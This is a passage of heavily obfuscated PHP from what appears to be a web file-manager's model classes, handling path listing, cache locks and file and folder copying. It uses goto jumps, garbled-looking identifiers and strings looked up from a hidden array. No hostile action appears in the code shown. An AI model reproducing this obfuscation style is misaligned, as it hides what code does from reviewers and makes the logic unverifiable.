} goto eÃã˜•³…»; B­½Ë¿¯”: } protected function _listAppendPathRoot(&$E¥ÙÙèŸ¨, $EÙèŞÒ¶ùñ) { $fŞ«ßÚ¬ğ³ =& $_SERVER[Ìó]; $Dğã¸à±‰Õ = $fŞ«ßÚ¬ğ³[33]; if ($E¥ÙÙèŸ¨[$fŞ«ßÚ¬ğ³[367]] == self::TYPE_USER) { if (defined($fŞ«ßÚ¬ğ³[422]) && $E¥ÙÙèŸ¨[$fŞ«ßÚ¬ğ³[451]] == USER_ID) { $Dğã¸à±‰Õ = LNG($fŞ«ßÚ¬ğ³[468]); if (!$EÙèŞÒ¶ùñ) { $E¥ÙÙèŸ¨[$fŞ«ßÚ¬ğ³[28]] = $Dğã¸à±‰Õ; } } else { $dÔ¨®Áî = Model($fŞ«ßÚ¬ğ³[469])->getInfoSimple($E¥ÙÙèŸ¨[$fŞ«ßÚ¬ğ³[451]]); $Dğã¸à±‰Õ = LNG($fŞ«ßÚ¬ğ³[470]) . $fŞ«ßÚ¬ğ³[153] . $dÔ¨®Áî[$fŞ«ßÚ¬ğ³[28]] . $fŞ«ßÚ¬ğ³[471]; } } else { if ($E¥ÙÙèŸ¨[$fŞ«ßÚ¬ğ³[367]] == self::TYPE_GROUP) { $dÔ¨®Áî = Model($fŞ«ßÚ¬ğ³[453])->getInfoSimple($E¥ÙÙèŸ¨[$fŞ«ßÚ¬ğ³[451]]); $Dğã¸à±‰Õ = $dÔ¨®Áî[$fŞ«ßÚ¬ğ³[28]]; } else { if ($E¥ÙÙèŸ¨[$fŞ«ßÚ¬ğ³[367]] == self::TYPE_SYSTEM) { $dÔ¨®Áî = $this->sourceInfo($EÙèŞÒ¶ùñ[0], !0); $Dğã¸à±‰Õ = $dÔ¨®Áî[$fŞ«ßÚ¬ğ³[28]]; } } } $Dğã¸à±‰Õ = $Dğã¸à±‰Õ ? $fŞ«ßÚ¬ğ³[8] . $Dğã¸à±‰Õ . $fŞ«ßÚ¬ğ³[8] : $fŞ«ßÚ¬ğ³[8]; return $Dğã¸à±‰Õ; } protected function _listAppendUser(&$fÔÌ¶¡µ†Â) { $eºåË —§™ =& $_SERVER[Ìó]; $B§Ëİ°œª† = array_to_keyvalue($fÔÌ¶¡µ†Â, $eºåË —§™[33], $eºåË —§™[374]); $f’ƒ×Ï‚ = array_to_keyvalue($fÔÌ¶¡µ†Â, $eºåË —§™[33], $eºåË —§™[375]); $c……ö¿‚Àù = array_merge($B§Ëİ°œª†, $f’ƒ×Ï‚); $eë‡¹ ÍÔæ = Model($eºåË —§™[472])->userListInfo($c……ö¿‚Àù); foreach ($fÔÌ¶¡µ†Â as &$Eä÷…¯Ê¤ì) { $E‹·‚¤Õ‰² = $Eä÷…¯Ê¤ì[$eºåË —§™[374]]; $Eä÷…¯Ê¤ì[$eºåË —§™[374]] = $eë‡¹ ÍÔæ[$E‹·‚¤Õ‰²] ? $eë‡¹ ÍÔæ[$E‹·‚¤Õ‰²] : !1; $E‹·‚¤Õ‰² = $Eä÷…¯Ê¤ì[$eºåË —§™[375]]; $Eä÷…¯Ê¤ì[$eºåË —§™[375]] = $eë‡¹ ÍÔæ[$E‹·‚¤Õ‰²] ? $eë‡¹ ÍÔæ[$E‹·‚¤Õ‰²] : !1; if (isset($Eä÷…¯Ê¤ì[$eºåË —§™[412]]) && $Eä÷…¯Ê¤ì[$eºåË —§™[412]][$eºåË —§™[473]]) { $FÆµ†¯£Øš = $GLOBALS[$eºåË —§™[6]][$eºåË —§™[84]][$eºåË —§™[474]]; if ($Eä÷…¯Ê¤ì[$eºåË —§™[412]][$eºåË —§™[475]] <= time() - $FÆµ†¯£Øš) { $this->metaSet($Eä÷…¯Ê¤ì[$eºåË —§™[365]], $eºåË —§™[473], null); $this->metaSet($Eä÷…¯Ê¤ì[$eºåË —§™[365]], $eºåË —§™[475], null); unset($Eä÷…¯Ê¤ì[$eºåË —§™[412]][$eºåË —§™[473]]); continue; } $f¡íõ¹™ = $Eä÷…¯Ê¤ì[$eºåË —§™[412]][$eºåË —§™[473]]; $Eä÷…¯Ê¤ì[$eºåË —§™[412]][$eºåË —§™[476]] = Model($eºåË —§™[472])->getInfoSimpleOuter($f¡íõ¹™); } } } public function parentLevelArray($Cá•‡Á¶†Ã) { $eÃê›çêé¹ =& $_SERVER[Ìó]; $Cá•‡Á¶†Ã = explode($eÃê›çêé¹[47], trim($Cá•‡Á¶†Ã, $eÃê›çêé¹[47])); return array_remove_value($Cá•‡Á¶†Ã, $eÃê›çêé¹[463]); } public function listAll($fÚó§²Ã¸×) { goto C¤«¾Õ»´¥; CèæŒÛæÈ: $this->_listAppendAuth($BÙŸ¥íÊ); $this->_listAppendUser($BÙŸ¥íÊ); $this->_listAppendPath($BÙŸ¥íÊ); goto e†š­…óëÌ; C¤«¾Õ»´¥: $a˜‹Ñ¨ÇÖ¢ =& $_SERVER[Ìó]; $a¹ÆçíÉ—Û = $this->sourceInfo($fÚó§²Ã¸×); $e‡’»¤¬‚ê = array($a˜‹Ñ¨ÇÖ¢[477] => array($a˜‹Ñ¨ÇÖ¢[478], $a¹ÆçíÉ—Û[$a˜‹Ñ¨ÇÖ¢[454]] . $fÚó§²Ã¸× . $a˜‹Ñ¨ÇÖ¢[479]), $a˜‹Ñ¨ÇÖ¢[480] => 0); goto a½Œ’¡ë´Ú; e†š­…óëÌ: $BÙŸ¥íÊ = array_to_keyvalue($BÙŸ¥íÊ, $a˜‹Ñ¨ÇÖ¢[365]); $A§ˆ˜Üóäê = "\x2f{$a¹ÆçíÉ—Û[$a˜‹Ñ¨ÇÖ¢[28]]}\x2f"; $A§ˆ˜Üóäê = $A§ˆ˜Üóäê == $a˜‹Ñ¨ÇÖ¢[462] ? $a˜‹Ñ¨ÇÖ¢[8] : $A§ˆ˜Üóäê; goto d›‚Ÿ«³Øî; d›‚Ÿ«³Øî: $fÕôîäç¥¡ = array(); foreach ($BÙŸ¥íÊ as $DêÂßÉ¨‹ => $C÷Øµ‚›ëº) { goto Dß¸øÚÛ•; Eõ²‚šöÙ»: for ($eëˆ±£¡ª = 0; $eëˆ±£¡ª < count($eœÕ‡Ö“À); $eëˆ±£¡ª++) { $eœêáÂ‹í¿ .= $BÙŸ¥íÊ[$eœÕ‡Ö“À[$eëˆ±£¡ª]][$a˜‹Ñ¨ÇÖ¢[28]] . $a˜‹Ñ¨ÇÖ¢[8]; } $eœêáÂ‹í¿ .= $C÷Øµ‚›ëº[$a˜‹Ñ¨ÇÖ¢[28]]; if ($C÷Øµ‚›ëº[$a˜‹Ñ¨ÇÖ¢[366]]) { $eœêáÂ‹í¿ .= $a˜‹Ñ¨ÇÖ¢[8]; } goto BÚ¨é‹ªÃ; BÖº¢ë¥Æ: if (!$C÷Øµ‚›ëº[$a˜‹Ñ¨ÇÖ¢[366]]) { $A¶Û¥£Ù²Š[$a˜‹Ñ¨ÇÖ¢[414]] = $C÷Øµ‚›ëº[$a˜‹Ñ¨ÇÖ¢[414]]; $A¶Û¥£Ù²Š[$a˜‹Ñ¨ÇÖ¢[484]] = $C÷Øµ‚›ëº[$a˜‹Ñ¨ÇÖ¢[75]]; } $fÕôîäç¥¡[] = $A¶Û¥£Ù²Š; goto C¡ã¢Õ…®î; Dß¸øÚÛ•: $eœÕ‡Ö“À = $this->parentLevelArray($C÷Øµ‚›ëº[$a˜‹Ñ¨ÇÖ¢[454]]); array_shift($eœÕ‡Ö“À); $eœêáÂ‹í¿ = $A§ˆ˜Üóäê; goto Eõ²‚šöÙ»; BÚ¨é‹ªÃ: $eœêáÂ‹í¿ = str_replace($a˜‹Ñ¨ÇÖ¢[462], $a˜‹Ñ¨ÇÖ¢[8], $eœêáÂ‹í¿); $eœêáÂ‹í¿ = str_replace($a˜‹Ñ¨ÇÖ¢[462], $a˜‹Ñ¨ÇÖ¢[8], $eœêáÂ‹í¿); $A¶Û¥£Ù²Š = array($a˜‹Ñ¨ÇÖ¢[383] => str_replace($a˜‹Ñ¨ÇÖ¢[462], $a˜‹Ñ¨ÇÖ¢[8], $eœêáÂ‹í¿), $a˜‹Ñ¨ÇÖ¢[483] => intval($C÷Øµ‚›ëº[$a˜‹Ñ¨ÇÖ¢[366]]), $a˜‹Ñ¨ÇÖ¢[387] => $this->pathInfoFilter($C÷Øµ‚›ëº, !0)); goto BÖº¢ë¥Æ; C¡ã¢Õ…®î: } return $fÕôîäç¥¡; goto A„ù«£ ÇÎ; a½Œ’¡ë´Ú: $cæ°ŞÆéñ = $a˜‹Ñ¨ÇÖ¢[481]; $D«ñ™­Ó ˆ = "\x4c\x45\x46\x54\x20\x4a\x4f\111\116\40{$this->tablePrefix}\x69\x6f\137\x66\x69\154\x65\x20\x66\151\154\145\40\157\x6e\40\163\157\165\x72\x63\x65\56\x66\x69\154\145\111\x44\x20\75\40\146\151\x6c\145\56\146\x69\154\145\x49\104"; $BÙŸ¥íÊ = $this->alias($a˜‹Ñ¨ÇÖ¢[482])->field($cæ°ŞÆéñ)->where($e‡’»¤¬‚ê)->join($D«ñ™­Ó ˆ)->select(); goto CèæŒÛæÈ; A„ù«£ ÇÎ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Cœ³ğàâÒŸ) { goto C„×ÒÅ’†; cİîÇ‡ÜöÑ: $this->_lockEvent($Cœ³ğàâÒŸ, array($aâ”Ó¶¯Š[488], $aâ”Ó¶¯Š[489]), $a”†„³­¥Ñ); $this->_lockCheckEnd($aâ”Ó¶¯Š[485], $Cœ³ğàâÒŸ); goto D´Œí÷ã—£; C„×ÒÅ’†: $aâ”Ó¶¯Š =& $_SERVER[Ìó]; if (!$this->allowLock()) { return; } $this->_lockCheck($aâ”Ó¶¯Š[485], $Cœ³ğàâÒŸ); goto Bä­²ˆ¹»Í; Bä­²ˆ¹»Í: $a”†„³­¥Ñ = 1; $this->_lockEvent($Cœ³ğàâÒŸ, array($aâ”Ó¶¯Š[486], $aâ”Ó¶¯Š[487]), $a”†„³­¥Ñ); $this->_lockParent($Cœ³ğàâÒŸ, array($aâ”Ó¶¯Š[487]), $a”†„³­¥Ñ); goto cİîÇ‡ÜöÑ; D´Œí÷ã—£: } public function lockCopyEnd($cëòì”¬) { $c÷¨êÀãŞ¬ =& $_SERVER[Ìó]; if (!$this->allowLock()) { return; } $F¤‚ˆ¼±ß¯ = 0; $this->_lockEvent($cëòì”¬, array($c÷¨êÀãŞ¬[486], $c÷¨êÀãŞ¬[487]), $F¤‚ˆ¼±ß¯); $this->_lockParent($cëòì”¬, array($c÷¨êÀãŞ¬[487]), $F¤‚ˆ¼±ß¯); $this->_lockEvent($cëòì”¬, array($c÷¨êÀãŞ¬[488], $c÷¨êÀãŞ¬[489]), $F¤‚ˆ¼±ß¯); } public function lockWriteStart($eä³ğ ªÙƒ, $CáóÀÇ˜İ = '') { goto cÓÄ‹Üİİï; cÓÄ‹Üİİï: $AÀ·¡½§‡¸ =& $_SERVER[Ìó]; if (!$this->allowLock()) { return; } $this->_lockCheck($AÀ·¡½§‡¸[486], $eä³ğ ªÙƒ); goto C¬·¢ã½Ìµ; e´ÕÙÚ£’‹: $this->_lockParent($eä³ğ ªÙƒ, array($AÀ·¡½§‡¸[485], $AÀ·¡½§‡¸[487]), $d’–ïëùŠ‚); $this->_lockCheckEnd($AÀ·¡½§‡¸[486], $eä³ğ ªÙƒ); goto B¬…©Çç¾»; C¬·¢ã½Ìµ: $d’–ïëùŠ‚ = 1; $this->_lockKey($AÀ·¡½§‡¸[490] . $eä³ğ ªÙƒ . $AÀ·¡½§‡¸[91] . $CáóÀÇ˜İ, $d’–ïëùŠ‚); $this->_lockEvent($eä³ğ ªÙƒ, array($AÀ·¡½§‡¸[485], $AÀ·¡½§‡¸[487]), $d’–ïëùŠ‚); goto e´ÕÙÚ£’‹; B¬…©Çç¾»: } public function lockWriteEnd($FÕË½âô×, $b‰ß¿å–¶ = '') { $F¾½º¯›É =& $_SERVER[Ìó]; if (!$this->allowLock()) { return; } $c¥ìÛËéåƒ = 0; $this->_lockKey($F¾½º¯›É[490] . $FÕË½âô× . $F¾½º¯›É[91] . $b‰ß¿å–¶, $c¥ìÛËéåƒ); $this->_lockEvent($FÕË½âô×, array($F¾½º¯›É[485], $F¾½º¯›É[487]), $c¥ìÛËéåƒ); $this->_lockParent($FÕË½âô×, array($F¾½º¯›É[485], $F¾½º¯›É[487]), $c¥ìÛËéåƒ); } public function lockMoveStart($EµÏ®ˆŠñğ) { goto CêŒİ—ÌÖÇ; e—ï¨ì§‡Â: $this->_lockParent($EµÏ®ˆŠñğ, array($eŒÍğ”‡ØĞ[485], $eŒÍğ”‡ØĞ[487]), $f‡×—Ö§ÌŒ); $this->_lockEvent($EµÏ®ˆŠñğ, array($eŒÍğ”‡ØĞ[492], $eŒÍğ”‡ØĞ[488], $eŒÍğ”‡ØĞ[489]), $f‡×—Ö§ÌŒ); $this->_lockCheckEnd($eŒÍğ”‡ØĞ[487], $EµÏ®ˆŠñğ); goto aØÖÁ¬°ß‰; CêŒİ—ÌÖÇ: $eŒÍğ”‡ØĞ =& $_SERVER[Ìó]; if (!$this->allowLock()) { return; } $this->_lockCheck($eŒÍğ”‡ØĞ[487], $EµÏ®ˆŠñğ); goto C¤øÀÌßŠ†; C¤øÀÌßŠ†: $f‡×—Ö§ÌŒ = 1; $this->_lockKey($eŒÍğ”‡ØĞ[491] . $EµÏ®ˆŠñğ, $f‡×—Ö§ÌŒ); $this->_lockEvent($EµÏ®ˆŠñğ, array($eŒÍğ”‡ØĞ[485], $eŒÍğ”‡ØĞ[486]), $f‡×—Ö§ÌŒ); goto e—ï¨ì§‡Â; aØÖÁ¬°ß‰: } public function lockMoveEnd($aŒ¤ò¶â¡) { goto b‹…ÅÔ§ø; eˆÊšïŒÖò: $this->_lockEvent($aŒ¤ò¶â¡, array($BĞ–éŒÃã[492], $BĞ–éŒÃã[488], $BĞ–éŒÃã[489]), $Bñáê³‰Š); goto C‰ßŞ­‰®ˆ; b‹…ÅÔ§ø: $BĞ–éŒÃã =& $_SERVER[Ìó]; if (!$this->allowLock()) { return; } $Bñáê³‰Š = 0; goto d‰ê¾ÕÒ±Œ; d‰ê¾ÕÒ±Œ: $this->_lockKey($BĞ–éŒÃã[491] . $aŒ¤ò¶â¡, $Bñáê³‰Š); $this->_lockEvent($aŒ¤ò¶â¡, array($BĞ–éŒÃã[485], $BĞ–éŒÃã[486]), $Bñáê³‰Š); $this->_lockParent($aŒ¤ò¶â¡, array($BĞ–éŒÃã[485], $BĞ–éŒÃã[487]), $Bñáê³‰Š); goto eˆÊšïŒÖò; C‰ßŞ­‰®ˆ: } private function _lockCheck($AÃ¡áŞÒ ‡, $fØŠ«ÔÚßâ) { goto AÓòìøØí; C“œµøÆ¸Î: $E½ïç¸¨”À = array_reverse($this->parentLevelArray($aù²øĞ‰²[$DÈĞ‘—¹Œ¤[454]])); foreach ($E½ïç¸¨”À as $c‹…°Àõ¹) { $BñŒÍ‹È² = $AÃ¡áŞÒ ‡ . $DÈĞ‘—¹Œ¤[494] . $c‹…°Àõ¹; if (CacheLock::lockGet($DÈĞ‘—¹Œ¤[495] . $BñŒÍ‹È²)) { $aù²øĞ‰² = $this->sourceInfo($c‹…°Àõ¹); CacheLock::setErrorMsg($DÈĞ‘—¹Œ¤[153] . htmlspecialchars($aù²øĞ‰²[$DÈĞ‘—¹Œ¤[28]]) . $DÈĞ‘—¹Œ¤[471] . $B†êººîó»); $this->_lockKey($BñŒÍ‹È², 1); $this->_lockKey($BñŒÍ‹È², 0); } } goto aÊùï¶İ; BÙ§óîç¯: $this->_lockTimeStart[$BñŒÍ‹È²] = timeFloat(); if (!is_array($aù²øĞ‰²)) { return; } $B†êººîó» = LNG($DÈĞ‘—¹Œ¤[493]); goto F¹¦ “Ê³¥; AÓòìøØí: $DÈĞ‘—¹Œ¤ =& $_SERVER[Ìó]; $aù²øĞ‰² = $this->sourceInfo($fØŠ«ÔÚßâ); $BñŒÍ‹È² = $AÃ¡áŞÒ ‡ . $DÈĞ‘—¹Œ¤[91] . $fØŠ«ÔÚßâ; goto BÙ§óîç¯; F¹¦ “Ê³¥: CacheLock::setErrorMsg($DÈĞ‘—¹Œ¤[153] . htmlspecialchars($aù²øĞ‰²[$DÈĞ‘—¹Œ¤[28]]) . $DÈĞ‘—¹Œ¤[471] . $B†êººîó»); $this->_lockKey($BñŒÍ‹È², 1); $this->_lockKey($BñŒÍ‹È², 0); goto C“œµøÆ¸Î; aÊùï¶İ: } private function _lockCheckEnd($eµçœˆêá‘, $BİÑ†¦É»ˆ) { goto BŞŒß³¯¯†; BŞŒß³¯¯†: $fé‚íÛµ‚´ =& $_SERVER[Ìó]; $bÓ‰«»ÌÙ = $eµçœˆêá‘ . $fé‚íÛµ‚´[91] . $BİÑ†¦É»ˆ; CacheLock::setErrorMsg($fé‚íÛµ‚´[357]); goto C†’ä¡‹‘; c›³ë Í…Î: if ($eøĞ´Ã…‚Ñ > 0.5) { unset(self::$cacheSourceInfo[$fé‚íÛµ‚´[405] . $BİÑ†¦É»ˆ]); } $F±¡¹ŞïÏ‘ = $this->sourceInfo($BİÑ†¦É»ˆ); if (!$F±¡¹ŞïÏ‘) { show_json(LNG($fé‚íÛµ‚´[100]), !1); } goto b»¥ˆ§Íé; C†’ä¡‹‘: if (!isset($this->_lockTimeStart[$bÓ‰«»ÌÙ])) { return; } $eøĞ´Ã…‚Ñ = timeFloat() - $this->_lockTimeStart[$bÓ‰«»ÌÙ]; unset($this->_lockTimeStart[$bÓ‰«»ÌÙ]); goto c›³ë Í…Î; b»¥ˆ§Íé: } private function _lockParent($aä³äÆˆõº, $aÏ§‡šÚ´ , $CÉ·ÄÔÔÍì) { if (!$this->autoLockSet) { return; } $D†‡¹’ëæ† = $this->sourceInfo($aä³äÆˆõº); if (!is_array($D†‡¹’ëæ†)) { return; } $c†²Ğï©İ¹ = array_reverse($this->parentLevelArray($D†‡¹’ëæ†[$_SERVER[Ìó][454]])); foreach ($c†²Ğï©İ¹ as $D«À¿¿‡’’) { $this->_lockEvent($D«À¿¿‡’’, $aÏ§‡šÚ´ , $CÉ·ÄÔÔÍì); } } private function _lockEvent($E–ºËƒÙ, $eÜ¢Å†¨ Ó, $BÂÛ×¨ö“) { $fÊ³®¡Æ† =& $_SERVER[Ìó]; if (!$this->autoLockSet) { return; } foreach ($eÜ¢Å†¨ Ó as $e÷ÊÕŞéí™) { $CğÚ›ãêŞà = $e÷ÊÕŞéí™ . $fÊ³®¡Æ†[91] . $E–ºËƒÙ; if ($BÂÛ×¨ö“ && CacheLock::lockGet($fÊ³®¡Æ†[495] . $CğÚ›ãêŞà)) { continue; } $this->_lockKey($CğÚ›ãêŞà, $BÂÛ×¨ö“); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Cº°Á×¹Ì, $F¼·’”âµ… = 1) { $A‰ğ®¹õÓ® = $_SERVER[Ìó][495] . md5($Cº°Á×¹Ì); if ($F¼·’”âµ…) { if (isset(self::$_lockItemArr[$A‰ğ®¹õÓ®])) { return; } self::$_lockItemArr[$A‰ğ®¹õÓ®] = 1; CacheLock::lock($A‰ğ®¹õÓ®, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$A‰ğ®¹õÓ®])) { return; } unset(self::$_lockItemArr[$A‰ğ®¹õÓ®]); CacheLock::unlock($A‰ğ®¹õÓ®); } } public function isParentOf($eøŠòÔÜö, $fòƒôÂµó—) { goto Cåİ»¤ß‰; Fóãã×¥¸å: $a¼¨òİÑ™¢ = $AÆ³ˆ—ò„¹[$f¸‰Ùºìí®[454]] . $AÆ³ˆ—ò„¹[$f¸‰Ùºìí®[365]] . $f¸‰Ùºìí®[47]; $Eİáöœ¸ùù = $cÖÚˆÉ«¦‚[$f¸‰Ùºìí®[454]] . $cÖÚˆÉ«¦‚[$f¸‰Ùºìí®[365]] . $f¸‰Ùºìí®[47]; $FöÂ¶…†‡ï = strpos($Eİáöœ¸ùù, $a¼¨òİÑ™¢) === 0; goto B¶Ê›Œ¥™; Cåİ»¤ß‰: $f¸‰Ùºìí® =& $_SERVER[Ìó]; $AÆ³ˆ—ò„¹ = $this->sourceInfo($eøŠòÔÜö); $cÖÚˆÉ«¦‚ = $this->sourceInfo($fòƒôÂµó—); goto Fóãã×¥¸å; B¶Ê›Œ¥™: return $FöÂ¶…†‡ï; goto A£ä×Ş´¶‘; A£ä×Ş´¶‘: } private $targetIsDelete = 0; public function copy($F±àáâæé„, $fìÂ”Í—Ï, $e»É¼­¯ë‚ = REPEAT_REPLACE, $D³†»Š˜ø¨ = '') { goto bÉ–Ï·‘İ÷; AîÂì¾ä›: $this->updateModifyTime($fìÂ”Í—Ï); return $dÍ²‡à—‰; goto c©¥½ç¸—; Fß¢Ìãœ…á: $this->saveAll($BÙ‘º…™[$b„˜Œçë‚Ü[498]]); Model($b„˜Œçë‚Ü[163])->linkAdd($BÙ‘º…™[$b„˜Œçë‚Ü[496]]); $this->folderSizeReset($fìÂ”Í—Ï); goto AîÂì¾ä›; b®Ã‰·Àå…: if ($dõŸÆ¦²Õ[$b„˜Œçë‚Ü[366]] == $b„˜Œçë‚Ü[83] && $E–¼·¢òÁ‚ == $dÍ²‡à—‰) { $this->folderSizeResetChildren($E–¼·¢òÁ‚); } Model($b„˜Œçë‚Ü[499])->addAll($BÙ‘º…™[$b„˜Œçë‚Ü[497]], array(), !0); if ($E–¼·¢òÁ‚ != $dÍ²‡à—‰ || $dõŸÆ¦²Õ[$b„˜Œçë‚Ü[366]] == $b„˜Œçë‚Ü[83]) { Model($b„˜Œçë‚Ü[500])->eventCopy($dÍ²‡à—‰); } goto Fß¢Ìãœ…á; e—¾ÉÀíÈ£: $this->lockCopyStart($F±àáâæé„); $this->lockWriteStart($fìÂ”Í—Ï, $Cëˆ–’ƒ®¤); $BÙ‘º…™ = array($b„˜Œçë‚Ü[496] => array(), $b„˜Œçë‚Ü[497] => array(), $b„˜Œçë‚Ü[498] => array()); goto aóÓ½É»›; eñ”÷Óãè˜: if (!$dõŸÆ¦²Õ || !$e´î”¼œ || $e´î”¼œ[$b„˜Œçë‚Ü[366]] != $b„˜Œçë‚Ü[83]) { return !1; } if ($this->isParentOf($F±àáâæé„, $fìÂ”Í—Ï)) { return !1; } $Cëˆ–’ƒ®¤ = $D³†»Š˜ø¨ ? $D³†»Š˜ø¨ : $dõŸÆ¦²Õ[$b„˜Œçë‚Ü[28]]; goto e—¾ÉÀíÈ£; BÄØƒËÊŞĞ: $this->_childrenListClear(); $this->lockCopyEnd($F±àáâæé„); $this->lockWriteEnd($fìÂ”Í—Ï, $Cëˆ–’ƒ®¤); goto b®Ã‰·Àå…; aóÓ½É»›: $this->targetIsDelete = intval($dõŸÆ¦²Õ[$b„˜Œçë‚Ü[392]]); $E–¼·¢òÁ‚ = $this->fileNameExistCache($fìÂ”Í—Ï, $dõŸÆ¦²Õ[$b„˜Œçë‚Ü[28]]); $dÍ²‡à—‰ = $this->_copy($F±àáâæé„, $fìÂ”Í—Ï, $e»É¼­¯ë‚, $BÙ‘º…™, !0, $D³†»Š˜ø¨); goto BÄØƒËÊŞĞ; bÉ–Ï·‘İ÷: $b„˜Œçë‚Ü =& $_SERVER[Ìó]; $dõŸÆ¦²Õ = $this->sourceInfo($F±àáâæé„); $e´î”¼œ = $this->sourceInfo($fìÂ”Í—Ï); goto eñ”÷Óãè˜; c©¥½ç¸—: } private function _copy($AÙÊç¬ª, $CÏ¼Ú´Æ–, $e…î ó„…, &$f’ğŸ…ñÒÃ, $aİƒÑŠ«ù, $AœßéŸ­´‰ = '') { goto f‰‚š¥¶…ß; f‰‚š¥¶…ß: $cğ‚ˆ²•¸‰ =& $_SERVER[Ìó]; $bìº„…ô² = $this->sourceInfoCache($AÙÊç¬ª); $bõ°ØŒ¥¢÷ = $bìº„…ô²[$cğ‚ˆ²•¸‰[366]] == $cğ‚ˆ²•¸‰[83]; goto dß¼°¢ Ä¬; cµ²Õº¢¤Œ: return $A§ğÖ¦Œ‰‡; goto DŠßÂ»š¾ƒ; E‘„§éÑŸÛ: if (!$f…šÁÌÚ—Ü) { return $this->_copyCreate($AÙÊç¬ª, $CÏ¼Ú´Æ–, $BÚè¡Â‡ïî, $f’ğŸ…ñÒÃ); } $A§ğÖ¦Œ‰‡ = $f…šÁÌÚ—Ü; if ($bõ°ØŒ¥¢÷) { if ($e…î ó„… == REPEAT_RENAME_FOLDER) { $BÚè¡Â‡ïî = $this->fileNameAutoCache($CÏ¼Ú´Æ–, $BÚè¡Â‡ïî, $e…î ó„…, $bõ°ØŒ¥¢÷); $A§ğÖ¦Œ‰‡ = $this->_copyCreate($AÙÊç¬ª, $CÏ¼Ú´Æ–, $BÚè¡Â‡ïî, $f’ğŸ…ñÒÃ); } else { $EÁÂŞ®˜àá = $this->_childrenList($AÙÊç¬ª); foreach ($EÁÂŞ®˜àá as $FÊøò½»ŸØ) { $this->_copy($FÊøò½»ŸØ[$cğ‚ˆ²•¸‰[365]], $f…šÁÌÚ—Ü, $e…î ó„…, $f’ğŸ…ñÒÃ, !1); } } } else { if ($e…î ó„… == REPEAT_RENAME || $e…î ó„… == REPEAT_RENAME_FOLDER) { $BÚè¡Â‡ïî = $this->fileNameAutoCache($CÏ¼Ú´Æ–, $BÚè¡Â‡ïî, $e…î ó„…, $bõ°ØŒ¥¢÷); $A§ğÖ¦Œ‰‡ = $this->_copyCreate($AÙÊç¬ª, $CÏ¼Ú´Æ–, $BÚè¡Â‡ïî, $f’ğŸ…ñÒÃ); } else { if ($e…î ó„… == REPEAT_REPLACE) { $CŠ¸œÉ™ÛĞ = $this->sourceInfoCache($f…šÁÌÚ—Ü); $bè‚ƒÒá»ˆ = $this->fileHistory($CŠ¸œÉ™ÛĞ, $bìº„…ô²[$cğ‚ˆ²•¸‰[414]], $bìº„…ô²[$cğ‚ˆ²•¸‰[77]]); if ($bè‚ƒÒá»ˆ) { $f’ğŸ…ñÒÃ[$cğ‚ˆ²•¸‰[496]][] = $bìº„…ô²[$cğ‚ˆ²•¸‰[414]]; } } else { if ($e…î ó„… == REPEAT_SKIP) { } } } Hook::trigger($cğ‚ˆ²•¸‰[501], array($cğ‚ˆ²•¸‰[502], $bìº„…ô², 0)); } goto cµ²Õº¢¤Œ; dß¼°¢ Ä¬: $BÚè¡Â‡ïî = $AœßéŸ­´‰ ? $AœßéŸ­´‰ : $bìº„…ô²[$cğ‚ˆ²•¸‰[28]]; $f…šÁÌÚ—Ü = $this->fileNameExistCache($CÏ¼Ú´Æ–, $BÚè¡Â‡ïî); if ($aİƒÑŠ«ù) { $this->_childrenAllMake($AÙÊç¬ª); if ($bõ°ØŒ¥¢÷ && $f…šÁÌÚ—Ü) { $this->_childrenAllMake($f…šÁÌÚ—Ü); } } goto E‘„§éÑŸÛ; DŠßÂ»š¾ƒ: } private function _copyCreate($aÚÕÜ÷«¨Í, $d®Ö¿‘ÍÇô, $D—Õ·÷¿«’, &$cº¬¾ì½ùˆ) { goto aƒ›Ùİš”½; E™“ğ×…¦’: $eº‰˜ë²‰[$aÚÕÜ÷«¨Í] = $C†µì®”èÒ; $c‰Ÿê­é¥õ = array(); $f¯èÆ•Ï®Ì = array(); goto B–´Š÷Õ¬Å; aƒ›Ùİš”½: $E¦¯«Ù¦Å =& $_SERVER[Ìó]; $câ®İò‰°ô = $this->sourceInfoCache($aÚÕÜ÷«¨Í); $C›òğæ¤¬ = $this->sourceInfoCache($d®Ö¿‘ÍÇô); goto aêâŞ¥öÀĞ; eÌËÑ·ğëÌ: $this->_childrenListAll($aÚÕÜ÷«¨Í, $dŸÃÕœåµä); $F·¼Ó¶Ïóå = count($dŸÃÕœåµä); if ($F·¼Ó¶Ïóå == 0) { return $C†µì®”èÒ; } goto bÏ‚­‰¾˜; CôóÊŸñÂò: $this->chunkEventSet($E¦¯«Ù¦Å[510], array($E¦¯«Ù¦Å[511], $eÈÔˆ§ÜŒ, $F·¼Ó¶Ïóå)); $this->saveAll($f¯èÆ•Ï®Ì); return $C†µì®”èÒ; goto B«Í‡‡Ş‡á; B–´Š÷Õ¬Å: foreach ($dø‚Ààù©‰ as $aùÖÏğ²») { $eàÉ½ÇíÍì = $aùÖÏğ²»[$E¦¯«Ù¦Å[365]]; $E„ñ«ÅÒ¨È = $this->_childrenMatch($eº‰˜ë²‰, $aùÖÏğ²», $b£¶Ü¶†ß); $c‰Ÿê­é¥õ[] = array($E¦¯«Ù¦Å[365], $eàÉ½ÇíÍì, $E¦¯«Ù¦Å[456], $E„ñ«ÅÒ¨È[$E¦¯«Ù¦Å[456]]); $f¯èÆ•Ï®Ì[] = array($E¦¯«Ù¦Å[365], $eàÉ½ÇíÍì, $E¦¯«Ù¦Å[454], $E„ñ«ÅÒ¨È[$E¦¯«Ù¦Å[454]]); $this->_copyApplyMeta($aùÖÏğ²», $cº¬¾ì½ùˆ); if ($aùÖÏğ²»[$E¦¯«Ù¦Å[366]] != $E¦¯«Ù¦Å[83]) { $cº¬¾ì½ùˆ[$E¦¯«Ù¦Å[496]][] = $aùÖÏğ²»[$E¦¯«Ù¦Å[414]]; } } $this->chunkEventSet($E¦¯«Ù¦Å[508], array($E¦¯«Ù¦Å[509], $eÈÔˆ§ÜŒ, $F·¼Ó¶Ïóå)); $this->saveAll($c‰Ÿê­é¥õ); goto CôóÊŸñÂò; f¹å›”Şë: if ($câ®İò‰°ô[$E¦¯«Ù¦Å[366]] != $E¦¯«Ù¦Å[83]) { $cº¬¾ì½ùˆ[$E¦¯«Ù¦Å[496]][] = $câ®İò‰°ô[$E¦¯«Ù¦Å[414]]; return $C†µì®”èÒ; } 